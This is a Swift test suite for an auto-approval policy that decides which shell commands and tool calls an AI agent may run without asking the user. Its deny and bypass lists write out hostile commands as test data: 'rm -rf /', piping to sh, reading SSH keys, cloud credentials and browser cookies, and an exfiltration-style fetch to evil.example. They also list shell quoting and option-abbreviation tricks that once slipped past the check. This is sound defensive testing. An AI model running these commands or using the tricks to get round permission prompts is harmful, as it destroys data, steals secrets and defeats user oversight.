@testable import CmuxChief
import Foundation
import Testing

@Suite struct ChiefToolPolicyTests {
    // MARK: Auto-allowed

    static let allowed: [String] = [
        // Saving a fact is visible in the transcript ("Chief will remember · Undo").
        "cmux chief memory add \"Uses worktrees under ~/src\"",
        "cmux chief memory add fact",
        // cmux reads (deny by default: only cmuxReadOnlyCommands)
        "cmux list-workspaces",
        "cmux tree --all",
        "cmux workspace list --json",
        "cmux current --json",
        "cmux identify --json",
        "cmux read-screen --workspace workspace:2 --lines 80",
        "cmux read-selection --workspace workspace:2",
        "cmux sidebar-state --workspace workspace:2",
        "cmux list-status --workspace workspace:2",
        "cmux list-notifications",
        "cmux list-log --limit 20",
        "cmux top --all",
        "cmux memory --all",
        "cmux version",
        "cmux help agents",
        "cmux docs shortcuts",
        "cmux settings path",
        "cmux config get terminal.scrollSpeed",
        "cmux todo list --workspace workspace:2",
        "cmux vm ls --json",
        "cmux vm status brave-otter",
        "cmux vm tree brave-otter --json",
        "cmux cloud ls --json",
        "cmux vm terminal read brave-otter term_1",
        "cmux vm terminal wait brave-otter term_1 --pattern Working --timeout 60",
        "cmux vm wait brave-otter",
        "cmux vm wait brave-otter --timeout 300",
        "cmux chief status --json",
        "cmux chief read --limit 5",
        "cmux chief conversations",
        "cmux chief memory list",
        "cmux list-workspaces | sort -nr -k2 | head",
        "cmux list-workspaces | sort -t: -k 2,2n --reverse",
        "git log HEAD~3 --oneline",
        // workspace create without a command (the lead's call: one card only when it runs something)
        "cmux workspace create --name Build",
        "cmux workspace create --name Build --cwd /Users/me/src/app --description 'API work' --json",
        "cmux workspace create --name=Build --focus false",
        "cmux workspace create --name Build --no-focus --group group:1",
        // the dogfood command that used to ask
        "cmux tree --all 2>&1 | head -100",
        "cmux tree --all 2>/dev/null | head -100",
        "cmux tree --all 2> /dev/null",
        "cmux tree --all >/dev/null 2>&1",
        "cmux workspace list --json | jq '.workspaces | length'",
        "cmux workspace list --json | jq -r '.workspaces[] | \"\\(.ref) \\(.title)\"'",
        "cmux tree --all | grep -c workspace",
        "cmux tree --all | rg -i agent | sort | uniq -c",
        "cmux list-workspaces | wc -l",
        "cmux list-workspaces | cut -d' ' -f1 | tr a-z A-Z | column -t",
        "cmux list-workspaces | awk '{print $1}'",
        "cmux list-workspaces | awk -F: 'NR==1 {print $2}'",
        "cmux list-workspaces | sed -n '1,5p'",
        "cmux list-workspaces | sed -n -e 's/workspace/ws/gp'",
        "cmux list-workspaces | sed -nE '/agent/p'",
        "cmux list-workspaces | sort -r | tail -3",
        // chained reads
        "cmux workspace list --json && cmux vm ls --json",
        "cmux tree --all; cmux current --json",
        "cmux tree --all\ncmux current --json",
        "cmux tree --all || cmux list-workspaces",
        "cmux tree;",
        // git and gh reads
        "git status",
        "git log --oneline -5",
        "git -C /tmp/repo status --short",
        "git --no-pager diff --stat",
        "git branch",
        "git branch -a",
        "git branch -vv",
        "git branch --show-current",
        "git branch --list 'feat/*'",
        "git branch --contains HEAD",
        "git remote -v",
        "git remote get-url origin",
        "git worktree list",
        "git stash list",
        "git tag",
        "git tag -l 'v1.*'",
        "git config --get user.email",
        "git rev-parse --abbrev-ref HEAD",
        "git log --oneline | head -3",
        "gh pr view 123",
        "gh pr checks 123",
        "gh issue list",
        "gh run list --limit 5",
        "gh pr list --json number,title | jq length",
        // plain read-only tools
        "ls /Users/tester/src/app",
        "pwd",
        "date",
        "which cmux",
        "cat README.md | head -20",
        "grep -rn TODO Sources | wc -l",
        "rg -l ChiefToolPolicy /Users/tester/src/app",
        // shell wrappers (Claude and Codex)
        "/bin/zsh -lc 'cmux tree --json'",
        "/bin/zsh -lc 'cmux tree --all 2>&1 | head -100'",
        "bash -c \"cmux workspace list --json | jq '.workspaces | length'\"",
        "/bin/zsh -lc 'cmux list-workspaces | awk '\"'\"'{print $1}'\"'\"''",
    ]

    // MARK: Asks first

    static let denied: [String] = [
        "",
        "   ",
        // cmux writes ask now (deny by default)
        "cmux notify --title hi",
        "cmux workspace create --name Build --cwd ~/src/app --command 'codex --yolo'",
        "cmux workspace create --name Build --command 'codex --yolo'",
        "cmux workspace create --name Build --command=id",
        "cmux workspace create --name Build --layout '{}'",
        "cmux workspace create --name Build --focus true",
        "cmux workspace create --name Build --focus",
        "cmux workspace create --name --command x",
        "cmux workspace create --name close",
        "cmux workspace create Build",
        "cmux new-workspace --name Build",
        // machine creation costs money; dispatch is one meaningful card
        "cmux vm new --detach",
        // `--wake` starts a stopped machine, which bills the user
        "cmux vm wait brave-otter --wake",
        "cmux vm wait brave-otter --timeout 300 --wake",
        "cmux cloud wait brave-otter --WAKE",
        "cmux vm wait brave-otter --wake=true",
        "cmux cloud new --size 8g",
        "cmux vm fork brave-otter",
        "cmux chief dispatch --agent codex --name fix 'fix the bug'",
        "cmux workspace rename workspace:2 --title \"API server\"",
        "cmux workspace env workspace:2",
        "cmux workspace status set auto",
        "cmux send --workspace workspace:2 --surface surface:3 \"npm test; echo done\\n\"",
        "cmux send-key --workspace workspace:2 --surface surface:3 enter",
        "cmux agent message workspace:2 \"please close the PR when done\"",
        "cmux agent inbox --mark-read",
        "cmux chief memory forget 3",
        "cmux config set app.theme dark",
        "cmux --json tree",
        "cmux tree-x",
        // destructive cmux verbs
        "cmux close-workspace --workspace workspace:2",
        "cmux workspace close workspace:2",
        "cmux close-surface --surface surface:3",
        "cmux close-window --window window:1",
        "cmux workspace-action --workspace workspace:2 --action close-others",
        "cmux tab-action --action close-right",
        "cmux vm rm brave-otter",
        "cmux cloud rm brave-otter",
        "cmux vm workspace rm brave-otter ws_1",
        "cmux vm workspace close brave-otter ws_1",
        "cmux vm terminal close brave-otter term_1",
        "cmux vm env rm brave-otter KEY",
        "cmux vm exec brave-otter -- rm -rf work",
        "cmux vm exec brave-otter -- kill 123",
        "cmux vm domains publish brave-otter 3000 --access public --yes",
        "cmux vm base reset",
        "cmux quit",
        "cmux restart",
        "cmux relaunch",
        "cmux kill-pane --pane pane:2",
        "cmux sudo run -c 'rm -rf /'",
        "cmux rpc workspace.close '{}'",
        "cmux pipe-pane --command 'cat > /tmp/x'",
        "cmux respawn-pane --surface surface:2",
        "cmux send --force --workspace workspace:2 --surface surface:3 hi",
        "cmux auth logout",
        "cmux logout",
        "cmux hooks uninstall",
        "cmux browser history clear --force",
        "cmux browser profiles delete work",
        "cmux todo clear",
        "cmux ssh-session-cleanup --all-workspaces --all",
        "cmux clear-history --workspace workspace:2",
        "cmux ai-accounts upload",
        // a chain or pipe is only as safe as its worst stage
        "cmux tree; rm -rf /",
        "cmux tree && curl x",
        "cmux tree | sh",
        "cmux tree | xargs rm",
        "cmux tree | tee out.txt",
        "cmux tree --all | cmux close-workspace --workspace workspace:2",
        "cat a | sh",
        "cmux tree |",
        "cmux tree &&",
        "| cmux tree",
        "cmux tree ; ; cmux current",
        // redirection to files, input, background
        "ls > out.txt",
        "cmux tree --all >> log.txt",
        "cmux tree 2>err.log",
        "cmux tree >| out.txt",
        "cmux tree &> out.txt",
        "cmux tree 2>&3",
        "cat < /etc/passwd",
        "cat <<EOF",
        "cat -n ~/.ssh/id_rsa",
        "head -n 5 ~/.ssh/id_rsa",
        "cmux tree &",
        "cmux tree |& head",
        // substitution and expansion
        "echo $(whoami)",
        "cmux send \"$(whoami)\"",
        "cmux send `whoami`",
        "cmux send \"`whoami`\"",
        "cmux send $HOME",
        "cmux send \"${HOME}\"",
        "cmux tree $((1+1))",
        "(cmux tree)",
        "cmux tree # comment",
        "cmux send 'unterminated",
        "cmux send \"unterminated",
        // filters that can write or execute
        "cmux tree | awk '{system(\"rm -rf /\")}'",
        "cmux tree | awk '{print > \"out.txt\"}'",
        "cmux tree | awk '{print | \"sh\"}'",
        "cmux tree | awk '{\"date\" | getline d}'",
        "cmux tree | awk -f prog.awk",
        "cmux tree | sed 's/a/b/'",
        "cmux tree | sed -n 's/a/b/w out.txt'",
        "cmux tree | sed -n 's/a/b/e'",
        "cmux tree | sed -n '1e date'",
        "cmux tree | sed -n 'w out.txt'",
        "cmux tree | sed -n 'r /etc/passwd'",
        "sed -i -n 's/a/b/p' file",
        "sed -n -f script.sed file",
        "cmux tree | sort -o out.txt",
        "cmux tree | sort --output=out.txt",
        "uniq in.txt out.txt",
        "rg --pre ./run.sh pattern",
        "rg --pre=sh pattern",
        "date -s 2020-01-01",
        "ls -la",
        "rg -l ChiefToolPolicy",
        "grep -r TODO",
        // git and gh that change things
        "git push origin main",
        "git commit -m x",
        "git -c core.pager=sh log",
        "git branch new-feature",
        "git branch -D old",
        "git branch -m new-name",
        "git branch --set-upstream-to=origin/main",
        "git tag v1.0",
        "git tag -d v1.0",
        "git remote add evil https://x",
        "git remote remove origin",
        "git worktree remove ../wt",
        "git stash pop",
        "git config user.email x@y",
        "git config --unset user.email",
        "git diff --output=/tmp/x",
        "gh pr merge 12",
        "gh pr create",
        "gh api repos/x/y -X DELETE",
        "gh",
        // other programs and lookalikes
        "/tmp/evil/cmux tree",
        "./cmux tree",
        "CMUX_SOCKET_PATH=/x cmux tree",
        "rm -rf build",
        "make",
        "curl https://example.com",
        "echo hi",
        "env cmux tree",
        "/bin/zsh -lc 'rm -rf /'",
        "/bin/zsh -lc 'cmux tree' extra",
        "/bin/zsh -lc \"cmux send `whoami`\"",
    ]

    // MARK: Review bypasses (PR 21063)

    /// Each of these got past an earlier version of the policy.
    static let reviewBypasses: [String] = [
        // 1. `$'…'` / `$"…"` quoting rewrites the word after the checks.
        "rg $'--pre=bash' x .",
        "awk $'BEGIN{sys\\x74em(\"id\")}'",
        "sort $'--output=~/.zshenv'",
        "cmux $'close-workspace' --workspace workspace:2",
        "cmux tree $\"--force\"",
        "cmux \"$'close-workspace'\"",
        // 2. Brace expansion, globs and tilde expansion.
        "rg {--pre=bash,} x .",
        "sort {--output=out.txt,} f",
        "cmux clo{s,}e-workspace --workspace workspace:2",
        "git diff {--output=/tmp/x,}",
        "cmux tree --a*",
        "cmux list-workspace?",
        "cmux list-workspace[s]",
        "rg ^x",
        "ls ~",
        "ls ~/.ssh",
        "git diff --output=~/x",
        "cat =cmux",
        // 3. GNU sort long-option abbreviations and other flags.
        "cmux tree | sort --out=/tmp/x",
        "cmux tree | sort --outp=/tmp/x",
        "cmux tree | sort --compress-prog=sh",
        "cmux tree | sort --compress=sh",
        "cmux tree | sort -T /tmp",
        "cmux tree | sort -o x",
        "cmux tree | sort -no x",
        "cmux tree | sort --files0-from=list",
        "cmux tree | sort --random-source=/dev/urandom",
        // git long-option abbreviations
        "git diff --outp=/tmp/x",
        "git log --outpu=/tmp/x",
        // 4. cmux verbs that make approvals a formality.
        "cmux send --workspace workspace:2 \"rm -rf ~\\n\"",
        "cmux send-key --workspace workspace:2 enter",
        "cmux send-panel --panel panel:1 hi",
        "cmux paste --submit hi",
        "cmux new-workspace --command 'rm -rf ~'",
        "cmux new-split right --command id",
        "cmux new-pane --command id",
        "cmux vm exec brave-otter -- id",
        "cmux vm run brave-otter id",
        "cmux vm terminal send brave-otter term_1 id --keys enter",
        "cmux browser eval 'document.cookie'",
        "cmux browser --surface surface:2 eval 1",
        "cmux chief approve",
        "cmux chief answer --choice '4 GB'",
        "cmux chief send hi",
        "cmux tree --force=true",
        "cmux list-workspaces --yes=1",
        "cmux read-screen --workspace workspace:2 close-workspace",
        "cmux events",
        "cmux set-status k v",
        "cmux hooks setup",
        // 5. tool-level reads are covered in claudeReadsAvoidCredentials.
    ]

    @Test(arguments: reviewBypasses)
    func reviewBypassesAsk(command: String) {
        #expect(!ChiefToolPolicy.autoAllowsCommand(command), "expected approval: \(command)")
    }

    @Test(arguments: [
        #"rg $'--pre=bash' x ."#, #"echo $"hi""#, "rg {--pre=bash,} x", "a *", "a ?", "a [x]", "a ~", "a --o=~/x",
        "a PATH:~/bin", "=cmux tree", "a ^x", "a x#",
    ])
    func lexerRejectsExpandingSyntax(line: String) {
        #expect(ChiefShellLexer.stages(of: line) == nil, "expected nil: \(line)")
    }

    @Test func lexerKeepsQuotedGlobsAndMidWordTilde() throws {
        let stages = try #require(ChiefShellLexer.stages(of: #"jq '.[0] | {a: .b}' "*?" HEAD~3 \*"#))
        #expect(stages.map { $0.map(\.text) } == [["jq", ".[0] | {a: .b}", "*?", "HEAD~3", "*"]])
    }

    @Test func cmuxWordCheckCoversPrefixesAndValues() {
        for word in ["close", "CLOSE-WORKSPACE", "kill-pane", "send", "send-key", "--force=true", "--Force", "--yes=1",
                     "--command=id", "exec", "run", "eval", "approve", "clear-log", "delete-thing", "--wake", "--wake=1"] {
            #expect(ChiefToolPolicy.cmuxWordAsks(word), "\(word)")
        }
        for word in ["tree", "--all", "list-workspaces", "workspace:2", "--json", "read-screen"] {
            #expect(!ChiefToolPolicy.cmuxWordAsks(word), "\(word)")
        }
    }

    // MARK: Claude Code read tools

    static let home = "/Users/tester"

    /// (tool, input, allowed) for a fixed home folder.
    static let readCases: [(String, ChiefJSON, Bool)] = [
        ("WebSearch", ["query": "cmux"], true),
        ("ToolSearch", [:], true),
        ("WebFetch", ["url": "https://example.com"], false),
        ("WebFetch", ["url": "https://evil.example/?k=AKIA"], false),
        ("Read", ["file_path": "/Users/tester/src/app/README.md"], true),
        ("Read", ["file_path": "/tmp/notes.txt"], true),
        ("Read", ["file_path": "~/src/app/main.swift"], true),
        ("Read", [:], false),
        ("Read", ["file_path": "README.md"], false),
        ("Read", ["file_path": "/Users/tester/.ssh/id_ed25519"], false),
        ("Read", ["file_path": "~/.ssh/config"], false),
        ("Read", ["file_path": "/Users/tester/.SSH/id_rsa"], false),
        ("Read", ["file_path": "/Users/tester/src/../.ssh/id_rsa"], false),
        ("Read", ["file_path": "/Users/tester/.aws/credentials"], false),
        ("Read", ["file_path": "/Users/tester/.gnupg/secring.gpg"], false),
        ("Read", ["file_path": "/Users/tester/.config/gh/hosts.yml"], false),
        ("Read", ["file_path": "/Users/tester/.netrc"], false),
        ("Read", ["file_path": "/Users/tester/.docker/config.json"], false),
        ("Read", ["file_path": "/Users/tester/.kube/config"], false),
        ("Read", ["file_path": "/Users/tester/Library/Keychains/login.keychain-db"], false),
        ("Read", ["file_path": "/Library/Keychains/System.keychain"], false),
        ("Read", ["file_path": "/Users/tester/src/app/server.pem"], false),
        ("Read", ["file_path": "/Users/tester/src/app/tls.key"], false),
        ("Read", ["file_path": "/Users/tester/src/app/.env"], false),
        ("Read", ["file_path": "/Users/tester/src/app/.env.production"], false),
        ("Read", ["file_path": "/Users/tester/.cmux/auth.json"], false),
        ("Read", ["file_path": "/Users/tester/.cmux/cloud/auth-token"], false),
        ("Read", ["file_path": "/Users/tester/.cmux/chief/memory/facts.jsonl"], true),
        ("Read", ["file_path": "/Users/tester/Library/Application Support/Google/Chrome/Default/Cookies"], false),
        ("Read", ["file_path": "/Users/tester/Library/Application Support/Arc/User Data/Default/Login Data"], false),
        ("Read", ["file_path": "/Users/tester/Library/Application Support/Other/Cookies"], false),
        ("Grep", ["pattern": "TODO", "path": "/Users/tester/src/app"], true),
        ("Grep", ["pattern": "TODO"], false),
        ("Grep", ["pattern": "BEGIN", "path": "/Users/tester"], false),
        ("Grep", ["pattern": "BEGIN", "path": "~"], false),
        ("Grep", ["pattern": "BEGIN", "path": "/"], false),
        ("Grep", ["pattern": "BEGIN", "path": "/Users"], false),
        ("Grep", ["pattern": "BEGIN", "path": "/Users/tester/Library"], false),
        ("Grep", ["pattern": "BEGIN", "path": "/Users/tester/.config"], false),
        ("Grep", ["pattern": "token", "path": "/Users/tester/.cmux"], false),
        ("Grep", ["pattern": "x", "path": "/Users/tester/.ssh"], false),
        ("Grep", ["pattern": "x", "path": "/Users/tester/src/app", "glob": "**/.env*"], false),
        ("Grep", ["pattern": "x", "path": "/Users/tester/src/app", "glob": "*.swift"], true),
        ("Glob", ["pattern": "**/*.swift", "path": "/Users/tester/src/app"], true),
        ("Glob", ["pattern": "**/*.pem", "path": "/Users/tester/src/app"], false),
        ("Glob", ["pattern": "**/*.swift"], false),
        ("Glob", ["pattern": "*", "path": "/Users/tester"], false),
        ("Write", ["file_path": "/tmp/x"], false),
    ]

    @Test(arguments: readCases.indices)
    func claudeReadsAvoidCredentials(index: Int) {
        let (tool, input, allowed) = Self.readCases[index]
        #expect(ChiefToolPolicy.autoAllowsClaudeTool(tool, input: input, home: Self.home) == allowed,
                "\(tool) \(input.compactText) expected \(allowed ? "allow" : "ask")")
    }

    @Test func aSymlinkToCredentialsAsks() throws {
        let root = FileManager.default.temporaryDirectory.appendingPathComponent("chief-policy-\(UUID().uuidString)")
        let home = root.appendingPathComponent("home")
        try FileManager.default.createDirectory(at: home.appendingPathComponent(".ssh"), withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: root) }
        let key = home.appendingPathComponent(".ssh/id_rsa")
        try Data("k".utf8).write(to: key)
        let link = root.appendingPathComponent("innocent.txt")
        try FileManager.default.createSymbolicLink(at: link, withDestinationURL: key)
        #expect(!ChiefToolPolicy.autoAllowsClaudeTool("Read", input: ["file_path": .string(link.path)], home: home.path))
        let plain = root.appendingPathComponent("plain.txt")
        try Data("p".utf8).write(to: plain)
        #expect(ChiefToolPolicy.autoAllowsClaudeTool("Read", input: ["file_path": .string(plain.path)], home: home.path))
    }

    @Test func shellReadersResolveRelativeCredentialPaths() throws {
        let root = FileManager.default.temporaryDirectory.appendingPathComponent("chief-shell-policy-\(UUID().uuidString)")
        let home = root.appendingPathComponent("home")
        let gh = home.appendingPathComponent(".config/gh")
        try FileManager.default.createDirectory(at: gh, withIntermediateDirectories: true)
        try Data("token".utf8).write(to: gh.appendingPathComponent("hosts.yml"))
        let link = home.appendingPathComponent("public.txt")
        try FileManager.default.createSymbolicLink(at: link, withDestinationURL: gh.appendingPathComponent("hosts.yml"))
        defer { try? FileManager.default.removeItem(at: root) }

        for command in [
            "cat README.md", "jq . README.md", "grep token README.md", "cut -d: -f1 README.md",
            "tr a-z A-Z", "column -t README.md", "rg token README.md", "sort README.md",
            "uniq README.md", "awk '{print}' README.md", "sed -n 'p' README.md",
        ] {
            #expect(ChiefToolPolicy.autoAllowsCommand(command, home: home.path), "expected allow: \(command)")
        }
        for command in [
            "cat .config/gh/hosts.yml", "jq . .config/gh/hosts.yml", "grep token .config/gh/hosts.yml",
            "cut -d: -f1 .config/gh/hosts.yml", "column -t .config/gh/hosts.yml",
            "rg token .config/gh/hosts.yml", "sort .config/gh/hosts.yml", "uniq .config/gh/hosts.yml",
            "awk '{print}' .config/gh/hosts.yml", "sed -n 'p' .config/gh/hosts.yml",
            "ls .config/gh", "cat public.txt", "cat -- .config/gh/hosts.yml",
        ] {
            #expect(!ChiefToolPolicy.autoAllowsCommand(command, home: home.path), "expected approval: \(command)")
        }
    }

    @Test func searchReadersRequireSafeRootsUnlessTheyFilterPipeInput() {
        #expect(!ChiefToolPolicy.autoAllowsCommand("ls -la", home: Self.home))
        #expect(!ChiefToolPolicy.autoAllowsCommand("rg -l ChiefToolPolicy", home: Self.home))
        #expect(!ChiefToolPolicy.autoAllowsCommand("grep -r TODO", home: Self.home))
        #expect(!ChiefToolPolicy.autoAllowsCommand("rg -R TODO /Users/tester/src/app", home: Self.home))
        #expect(ChiefToolPolicy.autoAllowsCommand("rg -l ChiefToolPolicy /Users/tester/src/app", home: Self.home))
        #expect(ChiefToolPolicy.autoAllowsCommand("grep -r TODO /Users/tester/src/app", home: Self.home))
        #expect(ChiefToolPolicy.autoAllowsCommand("cmux tree | grep -c workspace", home: Self.home))
        #expect(ChiefToolPolicy.autoAllowsCommand("cmux tree | rg -l workspace", home: Self.home))
    }

    @Test(arguments: allowed)
    func autoAllows(command: String) {
        #expect(ChiefToolPolicy.autoAllowsCommand(command), "expected auto-allow: \(command)")
    }

    @Test(arguments: denied)
    func asksFirst(command: String) {
        #expect(!ChiefToolPolicy.autoAllowsCommand(command), "expected approval: \(command)")
    }

    @Test func lexerSplitsStagesAndDropsHarmlessRedirects() throws {
        let stages = try #require(ChiefShellLexer.stages(of: "cmux tree --all 2>&1 | head -100"))
        #expect(stages.map { $0.map(\.text) } == [["cmux", "tree", "--all"], ["head", "-100"]])
        let quoted = try #require(ChiefShellLexer.stages(of: #"cmux send "a; b | c" 'd && e'"#))
        #expect(quoted.map { $0.map(\.text) } == [["cmux", "send", "a; b | c", "d && e"]])
        let escaped = try #require(ChiefShellLexer.stages(of: #"cmux send "cost \$5" it\'s"#))
        #expect(escaped.map { $0.map(\.text) } == [["cmux", "send", "cost $5", "it's"]])
        #expect(escaped[0].allSatisfy { !$0.expands })
        #expect(ChiefShellLexer.stages(of: "cmux send $HOME")?[0][2].expands == true)
    }

    @Test func unwrapsShellWrappersToOneWord() {
        #expect(ChiefToolPolicy.unwrapShell("/bin/zsh -lc 'cmux tree --json'") == "cmux tree --json")
        #expect(ChiefToolPolicy.unwrapShell("bash -c \"cmux send \\\"hi\\\"\"") == "cmux send \"hi\"")
        #expect(ChiefToolPolicy.unwrapShell("/bin/zsh -lc 'a '\"'\"'b'\"'\"''") == "a 'b'")
        #expect(ChiefToolPolicy.unwrapShell("/bin/zsh -lc 'cmux tree' extra") == "/bin/zsh -lc 'cmux tree' extra")
        #expect(ChiefToolPolicy.unwrapShell("cmux tree") == "cmux tree")
    }

    @Test func codexLegacyArgvKeepsItsScriptAsOneWord() {
        let joined = ChiefToolPolicy.shellJoin(["/bin/zsh", "-lc", "cmux tree --all 2>&1 | head -100"])
        #expect(joined == "/bin/zsh -lc 'cmux tree --all 2>&1 | head -100'")
        #expect(ChiefToolPolicy.autoAllowsCommand(joined))
        #expect(ChiefToolPolicy.shellJoin(["echo", "it's"]) == #"echo 'it'"'"'s'"#)
        #expect(!ChiefToolPolicy.autoAllowsCommand(ChiefToolPolicy.shellJoin(["/bin/zsh", "-lc", "cmux quit"])))
        #expect(!ChiefToolPolicy.autoAllowsCommand(ChiefToolPolicy.shellJoin(["/bin/zsh", "-lc", "cmux tree", "x; rm -rf /"])))
    }

    @Test func claudeBashUsesTheCommandPolicy() {
        #expect(ChiefToolPolicy.autoAllowsClaudeTool("Bash", input: ["command": "cmux tree --all 2>&1 | head -100"]))
        #expect(!ChiefToolPolicy.autoAllowsClaudeTool("Bash", input: ["command": "cmux workspace close workspace:2"]))
    }
}
